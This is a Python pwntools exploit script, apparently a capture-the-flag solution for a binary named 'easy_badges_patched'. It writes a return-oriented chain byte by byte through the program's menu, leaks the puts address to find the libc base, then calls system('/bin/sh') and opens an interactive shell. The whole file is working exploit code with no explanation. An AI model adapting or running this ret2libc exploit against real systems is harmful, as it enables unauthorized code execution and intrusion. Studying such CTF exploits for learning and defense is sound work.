#!/usr/bin/env python3

from pwn import *

elf = ELF("./easy_badges_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf

context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b edit_badge
    c
    ''')
else:
    conn = elf.process()

def scrivi(ind, step, tipo):
    shift = 0
    print(hex(ind))
    for i in range(step):
        conn.recvuntil(b"> :")
        conn.sendline(b"4")
        conn.recvuntil(b"Byte:")
        p = str((ind >> shift )& 0xff).encode()
        g = conn.sendline(p)
        shift += 8
        conn.recvuntil(b"> :")
        conn.sendline(b"1")
        conn.recvuntil(b"Steps:")
        conn.sendline(b"1")
    for i in range(tipo):
        conn.recvuntil(b"> :")
        conn.sendline(b"4")
        conn.recvuntil(b"Byte:")
        conn.sendline(b"0")
        conn.recvuntil(b"> :")
        conn.sendline(b"1")
        conn.recvuntil(b"Steps:")
        conn.sendline(b"1")
   

POP_RDI = 0x401249
RET = 0x40101a

def main():
    
    conn.sendline(b"1")
    conn.sendline(b"88")
    
    

    scrivi(POP_RDI, 3, 5)
    scrivi(elf.got["puts"], 3, 5)
    scrivi(elf.plt["puts"], 3, 5)
    scrivi(elf.sym["main"], 3, 5)
    conn.sendlineafter(b': ',b'6')

    conn.recvuntil(b"!")
    conn.recvline()
    leak = u64(conn.recvline().strip().ljust(8, b"\x00"))

    libc.address = leak - libc.sym["puts"]
    print(hex(libc.address))
    diobestia = next(libc.search(b"/bin/sh"))

    conn.sendline(b"1")
    conn.sendline(b"88")

    scrivi(POP_RDI, 3, 5)
    scrivi(diobestia, 6, 2)
    scrivi(RET, 3, 5)
    scrivi(libc.sym["system"], 6, 2)
    conn.sendlineafter(b': ',b'6')
    conn.interactive()


if __name__ == "__main__":
    main()
